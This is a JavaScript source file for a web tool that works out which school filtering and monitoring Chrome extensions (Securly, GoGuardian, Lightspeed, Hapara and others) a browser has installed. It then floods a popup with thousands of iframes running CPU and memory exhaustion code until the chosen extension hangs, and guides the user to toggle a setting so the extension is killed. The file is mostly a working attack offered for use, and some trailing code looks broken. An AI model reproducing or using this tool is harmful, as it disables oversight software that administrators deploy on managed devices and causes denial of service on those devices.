document.addEventListener("DOMContentLoaded", function () {
  const slider = document.getElementById("iframeCountSlider");
  const sliderValueDisplay = document.getElementById("iframeCountValue");
  const iframeSelect = document.getElementById("iframeSelect");
  const hangButton = document.getElementById("hangButton");
  const killButton = document.getElementById("killButton");
  const overlay = document.getElementById("overlay");
  const killExtensionText = document.getElementById("killExtensionText");
  const deviceMemory = navigator.deviceMemory || 8;
  const defaultIframeCount = Math.round(deviceMemory * 500);
  const maxIframeCount = Math.round(deviceMemory * 1500);

  slider.value = defaultIframeCount;
  slider.max = maxIframeCount;
  sliderValueDisplay.textContent = defaultIframeCount;

  slider.addEventListener("input", function () {
    sliderValueDisplay.textContent = this.value;
  });

  async function checkExtensionURL(url) {
    try {
      const response = await fetch(url);
      return response.ok;
    } catch (error) {
      return false;
    }
  }

  async function populateSelectOptions() {
    const selectElement = document.getElementById("iframeSelect");
    const extensions = {
      "Securly": "chrome-extension://joflmkccibkooplaeoinecjbmdebglab/fonts/Metropolis.css",
      "Securly (old)": "chrome-extension://iheobagjkfklnlikgihanlhcddjoihkg/fonts/Metropolis.css",
      "GoGuardian": "chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/youtube_injection.js",
      "LANSchool": "chrome-extension://baleiojnjpgeojohhhfbichcodgljmnj/blocked.html",
      "Linewize": "chrome-extension://ddfbkhpmcdbciejenfcolaaiebnjcbfc/background/assets/pages/default-blocked.html",
      "Blocksi": "chrome-extension://ghlpmldmjjhmdgmneoaibbegkjjbonbk/pages/blockPage.html",
      "FortiGuard": "chrome-extension://igbgpehnbmhgdgjbhkkpedommgmfbeao/youtube_injection.js",
      "Cisco Umbrella": "chrome-extension://jcdhmojfecjfmbdpchihbeilohgnbdci/blocked.html",
      "ContentKeeper": "chrome-extension://jdogphakondfdmcanpapfahkdomaicfa/img/ckauth19x.png",
      "CK-Authenticator G3": "chrome-extension://odoanpnonilogofggaohhkdkdgbhdljp/img/ckauth19x.png",
      "Securly Classroom": "chrome-extension://jfbecfmiegcjddenjhlbhlikcbfmnafd/notfound.html",
      "Hapara": "chrome-extension://kbohafcopfpigkjdimdcdgenlhkmhbnc/blocked.html",
      "Hapara (new ID)": "chrome-extension://aceopacgaepdcelohobicpffbbejnfac/blocked.html",
      "iboss": "chrome-extension://kmffehbidlalibfeklaefnckpidbodff/restricted.html",
      "Lightspeed Digital Insight Agent": "chrome-extension://njdniclgegijdcdliklgieicanpmcngj/js/wasm_exec.js",
      "Lightspeed Filter Agent": "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/icon-128.png",
      "Lightspeed Classroom": "chrome-extension://kkbmdgjggcdajckdlbngdjonpchpaiea/assets/icon-classroom-128.png",
      "InterCLASS Filtering Service": "chrome-extension://jbddgjglgkkneonnineaohdhabjbgopi/pages/message-page.html",
      "InterSafe GatewayConnection Agent": "chrome-extension://ecjoghccnjlodjlmkgmnbnkdcbnjgden/resources/options.js",
      "LoiLo Web Filters": "chrome-extension://pabjlbjcgldndnpjnokjakbdofjgnfia/image/allow_icon/shield_green_128x128.png",
      "Gopher Buddy": "chrome-extension://cgbbbjmgdpnifijconhamggjehlamcif/images/gopher-buddy_128x128_color.png",
      "LanSchool Web Helper": "chrome-extension://honjcnefekfnompampcpmcdadibmjhlk/blocked.html",
      "IMTLazarus": "chrome-extension://cgigopjakkeclhggchgnhmpmhghcbnaf/models/model.json",
      "Impero Backdrop": "chrome-extension://jjpmjccpemllnmgiaojaocgnakpmfgjg/licenses.html",
      "Mobile Guardian": "chrome-extension://fgmafhdohjkdhfaacgbgclmfgkgokgmb/block.html",
      "NetSupport School Student": "chrome-extension://gcjpefhffmcgplgklffgbebganmhffje/_locales/lt/messages.json",
      "Lightspeed Alert Agent": "chrome-extension://gcjpefhffmcgplgklffgbebganmhffje/_locales/lt/main.js",
      "Lightspeed Alert Agent 2": "chrome-extension://gcjpefhffmcgplgklffgbebganmhffje/_locales/lt/in_page.js",
      "Lockdown Browser": "chrome-extension://fogjeanjfbiombghnmkmmophfeccjdki/manifest.json",
      "Linewize Filter": "chrome-extension://ifinpabiejbjobcphhaomiifjibpkjlf/background/assets/pages/default-blocked.html",
      "Borderless Classroom Student": "chrome-extension://kdpgkligilplaanoablcpjahjjeghcl/pages/blockPage.html"
    };
    for (const [name, url] of Object.entries(extensions)) {
      if (await checkExtensionURL(url)) {
        const option = document.createElement("option");
        option.value = url;
        option.textContent = name;
        selectElement.appendChild(option);
      }
    }
  }

  async function createIframeWithHang(iframeSrc, iframeContainer) {
    const iframe = document.createElement('iframe');
    iframe.src = iframeSrc;
    iframe.style.width = '100%';
    iframe.style.height = '100px';
    iframe.onload = () => {
      try {
        const iframeDocument = iframe.contentDocument;

        (function() {
          const iframeDocument = document;
          
          // B. Intense CPU Consumption
          const cpuBoundTasks = [];
          for (let i = 0; i < 4; i++) {
            const worker = new Worker(URL.createObjectURL(new Blob([`
              self.onmessage = function(e) {
                let result = 0;
                for (let i = 0; i < 10000000; i++) {
                  result += Math.sin(i);
                }
                self.postMessage(result);
              };
            `], { type: 'text/javascript' })));
            worker.postMessage(null);
            cpuBoundTasks.push(worker);
          }
        
          let cpuLoop = true;
          let cpuLoopStartTime = Date.now();
          const cpuLoopInterval = setInterval(() => {
            if (cpuLoop) {
              let result = 0;
              for (let i = 0; i < 100000; i++) {
                result += Math.sin(i);
              }
              if (Date.now() - cpuLoopStartTime > 5000) {
                cpuLoop = false;
                clearInterval(cpuLoopInterval);
              }
            }
          }, 1);
        
          function recursiveFunction(depth) {
            if (depth > 1000) return;
            recursiveFunction(depth + 1);
          }
          recursiveFunction(0);
        
          // C. Event Loop Blocking & Overload
          for (let i = 0; i < 1000; i++) {
            Promise.resolve().then(() => {
              let result = 0;
              for (let j = 0; j < 10000; j++) {
                result += Math.cos(j);
              }
            });
          }
        
          for (let i = 0; i < 1000; i++) {
            setTimeout(() => {
              let result = 0;
              for (let j = 0; j < 10000; j++) {
                result += Math.tan(j);
              }
            }, 1);
          }
        
          // D. Subtle & Continuous Resource Exhaustion
          let subtleLeak = [];
          setInterval(() => {
            subtleLeak.push({});
            iframeDocument.body.appendChild(iframeDocument.createElement('span'));
          }, 100);
        
          let subtleCpu = 0;
          const subtleCpuInterval = setInterval(() => {
            for (let i = 0; i < 10000; i++) {
              subtleCpu += Math.sqrt(i);
            }
          }, 100);
        
          // E. Exploiting Browser Rendering and Layout Engines
          let reflowElement = iframeDocument.createElement('div');
          reflowElement.style.width = '100px';
          reflowElement.style.height = '100px';
          reflowElement.style.backgroundColor = 'red';
          iframeDocument.body.appendChild(reflowElement);
        
          setInterval(() => {
            reflowElement.style.width = Math.random() * 200 + 'px';
            reflowElement.offsetWidth;
            reflowElement.style.height = Math.random() * 200 + 'px';
          }, 10);
        
          // F. Subtle Event Loop Manipulation
          let promiseChain = Promise.resolve();
          for (let i = 0; i < 100; i++) {
            promiseChain = promiseChain.then(() => new Promise(resolve => setTimeout(resolve, 10)));
          }
        })();
      } catch (error) {
        console.error("Error in iframe onload:", error);
      }
    };
    iframeContainer.appendChild(iframe);
  }

  function replaceIframes(iframeContainer, selectedSrc, iframeCount) {
    iframeContainer.innerHTML = '';
    for (let i = 0; i < iframeCount; i++) {
      createIframeWithHang(selectedSrc, iframeContainer);
    }
  }

  hangButton.addEventListener("click", function () {
    overlay.style.display = "flex";
    const selectedOption = iframeSelect.options[iframeSelect.selectedIndex].text;
    const selectedSrc = iframeSelect.value;
    const iframeCount = parseInt(slider.value, 10);

    const popup = window.open("", "PopupWindow", `width=${window.screen.width},height=${window.screen.height}`);
    const popupDocument = popup.document;
    const iframeContainer = popupDocument.createElement('div');
    iframeContainer.id = 'iframeContainer';
    popupDocument.body.appendChild(iframeContainer);

    replaceIframes(iframeContainer, selectedSrc, iframeCount);

    setTimeout(() => {
      popup.close();
      killExtensionText.innerHTML = `Now that the extension <strong>${selectedOption}</strong> has been hanged, press the button above.`;
      setTimeout(() => {
        overlay.style.display = "none";
        killExtensionText.style.display = "block";
        killButton.style.display = "inline-block";
        hangButton.style.display = "none";
        iframeSelect.style.display = "none";
        document.getElementById("labelForIframeSelect").style.display = "none";
        slider.style.display = "none";
        sliderValueDisplay.style.display = "none";
        document.getElementById("labelForIframeSlider").style.display = "none";
        killButton.setAttribute("data-url", selectedSrc);
      }, 10000);
    }, 5000);
  });

  killButton.addEventListener("click", function () {
    const selectedSrc = killButton.getAttribute("data-url");
    const extensionId = selectedSrc.substring(selectedSrc.indexOf("//") + 2, selectedSrc.indexOf("/", selectedSrc.indexOf("//") + 2));
    killButton.style.display = "none";
    killExtensionText.innerHTML = `Make sure to keep this tab open. Then open <a href="chrome://extensions/?id=${extensionId}" target="_blank" style="color: blue; text-decoration: underline;">chrome://extensions/?id=${extensionId}</a> and flip the switch called "Allow access to file URLs" twice. The extension was successfully killed! Now you can close that tab as well as this one. If you want to restore the extension, flip the allow access to file URLs switch again.`;
  });

  populateSelectOptions();
});

  // K. Advanced Memory Exhaustion Techniques
  let wasmMemory;
  fetch('wasm/memory.wasm')
    .then(response => response.arrayBuffer())
    .then(bytes => WebAssembly.instantiate(bytes))
    .then(results => {
      wasmMemory = results.instance.exports.memory;
      setInterval(() => {
        const newBuffer = new Uint8Array(wasmMemory.buffer.byteLength * 2);
        wasmMemory.buffer = newBuffer.buffer;
      }, 100);
    });

  let obj1 = {};
  let obj2 = {};
  obj1.ref = obj2;
  obj2.ref = obj1;
  setInterval(() => {
    let obj3 = {};
    let obj4 = {};
    obj3.ref = obj4;
    obj4.ref = obj3;
  }, 100);

  let weakRef = new WeakRef({});
  setInterval(() => {
    if (weakRef.deref() === undefined) {
      weakRef = new WeakRef({});
    }
  }, 100);

  let largeString = "start";
  setInterval(() => {
    largeString += "add";
  }, 10);

  
  // L. Refining CPU-Bound Operations
  let cacheInvalidationArray = new Array(100000).fill(0);
  setInterval(() => {
    for (let i = 0; i < 10000; i++) {
      cacheInvalidationArray[Math.floor(Math.random() * 100000)]++;
    }
  }, 10);

  let deoptimizationVar = 0;
  function deoptimizeMe(x) {
    if (x > 100) {
      return x;
    }
    return deoptimizeMe(x + 1);
  }
  setInterval(() => {
    deoptimizationVar = deoptimizeMe(deoptimizationVar);
  }, 10);

  let matrix = new Array(100).fill(null).map(() => new Array(100).fill(0));
  setInterval(() => {
    for (let i = 0; i < 100; i++) {
      for (let j = 0; j < 100; j++) {
        matrix[i][j] += Math.random();
      }
    }
  }, 10);
